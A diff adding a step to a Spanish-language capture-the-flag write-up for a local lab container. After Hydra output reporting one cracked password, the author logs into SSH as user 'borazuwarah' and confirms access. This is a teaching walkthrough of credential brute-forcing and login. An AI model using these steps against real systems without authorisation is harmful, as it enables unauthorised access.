@@ -168,3 +168,20 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-11 13:48:
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-11 13:48:14
 ```
+
+Con esta información vamos a intentar logaearnos en el servicio SSH y ver si conseguimos acceso a un posible usuario *borazuwarah*.
+```ruby
+❯ ssh borazuwarah@172.17.0.2
+borazuwarah@172.17.0.2's password: 
+Linux bf71f7833063 6.12.38+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.12.38-1kali1 (2025-08-12) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+borazuwarah@bf71f7833063:~$ whoami
+borazuwarah
+```
+Como era de esperar, estamos dentro del servicio SSH con el usuario *borazuwarah*.  
